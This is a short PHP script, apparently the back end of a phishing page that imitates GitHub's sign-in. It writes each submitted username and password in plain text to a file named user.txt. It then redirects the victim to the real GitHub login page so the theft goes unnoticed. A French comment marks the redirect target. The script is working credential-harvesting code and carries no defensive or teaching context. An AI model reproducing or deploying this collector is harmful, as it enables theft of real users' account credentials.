<?php

file_put_contents("user.txt", "Username : " . $_POST['login'] . "\npassword : " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/login');
exit();
// header('Location: https://??'); le site ver le quelle on redirige 
?>